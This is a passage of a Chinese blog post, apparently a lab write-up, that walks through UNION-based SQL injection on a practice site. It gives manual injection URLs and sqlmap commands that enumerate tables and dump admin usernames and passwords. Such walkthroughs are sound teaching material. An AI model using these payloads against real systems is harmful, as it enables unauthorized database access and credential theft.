+<p>接下来是查询数据库 <code>maoshe</code>里有哪些表名</p>
+<p>地址栏输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#34;maoshe&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后的页面：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg" title="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg, https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg 1.5x, https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg">
+    </a></figure></p>
+<p>得到了 <code>maoshe</code> 数据库下的所有表名： <code>admin</code>,<code>dirs</code>,<code>news</code>,<code>xss</code></p>
+<p>根据经验，<code>admin</code>表（admin意思是管理员）里肯定有“好东西”</p>
+<blockquote>
+<p>当然，可以每个表都查一遍</p>
+</blockquote>
+<p>现在来查询<code>admin</code>表里有哪些字段</p>
+<p>地址栏里输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#34;admin&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后的页面：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg" title="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg, https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg 1.5x, https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg">
+    </a></figure></p>
+<p>得到了 <code>admin</code>表下的所有字段名： <code>Id</code>,<code>username</code>,<code>password</code></p>
+<p>根据经验，<code>password</code>字段和<code>username</code>字段里肯定有“好东西”（<code>username</code>意思是用户名、<code>password</code>意思是密码）</p>
+<blockquote>
+<p>当然，也可以去看看其他的字段里存什么数据</p>
+</blockquote>
+<p>现在来查询<code>password</code>字段和<code>username</code>字段里有啥数据</p>
+<p>地址栏里输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(username) from admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(password) from admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后的页面：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg" title="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg, https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg 1.5x, https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg" title="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg, https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg 1.5x, https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg">
+    </a></figure></p>
+<p>获取到了<code>username</code>：<strong>admin</strong>、<code>password</code>：<strong>hellohack,zkaqbanban</strong></p>
+<p>把<strong>hellohack,zkaqbanban</strong>拿去提交结果是错误的，给我看傻了好久，于是乎我把数据库里的所有表里的所有字段都翻了一遍，并没有所谓的“flag”</p>
+<p>我就在想不会是要拿着用户名密码去<strong>登后台</strong>吧，我又用<code>dirsearch</code> 把网站的目录扫了一遍，并没有发现所谓的<strong>后台登陆界面</strong></p>
+<p>实在没办法我就把<strong>hellohack</strong>拿去提交，结果就正确了（雾）。</p>
+<p>​</p>
+<h3 id="使用工具sqlmap注入" class="headerLink">
+    <a href="#%e4%bd%bf%e7%94%a8%e5%b7%a5%e5%85%b7sqlmap%e6%b3%a8%e5%85%a5" class="header-mark"></a>使用工具sqlmap注入：</h3><p>首先还是得先找到地址栏（URL）类似为：<code>http://xxxxxxx?id=数字</code>的页面</p>
+<p>点击<strong>查看新闻</strong>的按钮</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg" title="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg, https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg 1.5x, https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg">
+    </a></figure></p>
+<p>点完之后的URL为：<code>http://pu2lh35s.ia.aqlab.cn/?id=1</code>,符合要求</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg" title="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg, https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg 1.5x, https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg">
+    </a></figure></p>
+<p>打开sqlmap，输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://pu2lh35s.ia.aqlab.cn/?id=1&#34; --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一步是扫出网站数据库名</p>
+<p>结果如下：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg" title="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg" data-thumbnail="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg"
+            srcset="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg, https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg 1.5x, https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg">
+    </a></figure></p>
+<p>从sqlmap扫到的数据库名来看我们得到了三个数据库名：</p>
+<ul>
+<li><code>information_schema</code></li>
+<li><code>maoshe</code></li>
+<li><code>test</code></li>
+</ul>
+<p>文章开头提到的，在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个<code>information_schema</code>的数据库</p>
+<p><code>test</code>数据库是MySQL系统默认安装时自带的一个数据库名，它通常用于进行测试和示例目的，而不是用于实际的生产环境</p>
+<p>于是我们得到了网站的数据库名为：<code> maoshe</code></p>
+<blockquote>
+<p>与之前手工注入的结果一样</p>
+</blockquote>
+<p>接下来要去扫<code>maoshe</code>数据库下的表名，输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://pu2lh35s.ia.aqlab.cn/?id=1&#34; -D maoshe --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg" title="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg" data-thumbnail="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg"
+            srcset="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg, https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg 1.5x, https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg">
+    </a></figure></p>
+<p>从sqlmap扫到的数据库名来看我们得到了四个数据表名：</p>
+<ul>
+<li><code>admin</code></li>
+<li><code>dirs</code></li>
+<li><code>news</code></li>
+<li><code>xss</code></li>
+</ul>
+<p>接下来是查询<code>admin</code>表下有哪些字段名，输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://pu2lh35s.ia.aqlab.cn/?id=1&#34; -D maoshe -T admin --columns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg" title="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg" data-thumbnail="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg"
+            srcset="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg, https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg 1.5x, https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg">
+    </a></figure></p>
+<p>从sqlmap扫到的字段(列)名来看我们得到了四个字段名：</p>
+<ul>
+<li><code>Id</code></li>
+<li><code>username</code></li>
+<li><code>password</code></li>
+</ul>
+<p>接下来是查询<code>password</code>字段里存放的数据，输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://pu2lh35s.ia.aqlab.cn/?id=1&#34; -D maoshe -T admin -C password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg" title="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg" data-thumbnail="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg"
+            srcset="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg, https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg 1.5x, https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg">
+    </a></figure></p>
+<p>sqlmap扫到<code>password</code>字段里存放的数据为：</p>
+<p><code>hellohack zkaqbanban</code></p>
+<p>​</p>
+<p>​</p>
+<p><strong>参考文章：</strong>
+<a href="http://t.csdn.cn/3SJAU" target="_blank" rel="noopener noreferrer">http://t.csdn.cn/3SJAU</a>
+<a href="https://zhuanlan.zhihu.com/p/397815893" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/397815893</a>
+<a href="http://t.csdn.cn/DTTTa" target="_blank" rel="noopener noreferrer">http://t.csdn.cn/DTTTa</a></p>
+</div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-10-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SQL注入漏洞</a>,&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
